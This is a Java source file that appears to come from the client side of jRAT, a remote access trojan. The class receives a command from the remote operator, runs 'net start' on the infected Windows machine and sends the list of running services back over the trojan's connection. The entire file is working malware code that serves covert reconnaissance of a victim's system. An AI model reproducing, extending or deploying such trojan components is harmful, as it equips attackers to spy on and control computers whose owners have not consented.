package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.packets.outgoing.Packet52WindowsService;
import oslib.OperatingSystem;

import java.io.BufferedReader;
import java.io.InputStreamReader;


public class Packet77ListServices implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		try {
			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				Process p = Runtime.getRuntime().exec("net start");
				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

				String line;

				while ((line = reader.readLine()) != null) {
					if (line.startsWith(" ")) {
						con.addToSendQueue(new Packet52WindowsService(line.trim()));
					}
				}
				reader.close();
			} else {
				throw new Exception("Windows only");
			}
		} catch (Exception ex) {
			ex.printStackTrace();
			con.addToSendQueue(new Packet52WindowsService("Error starting \"net start\" process: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
		}
	}

}
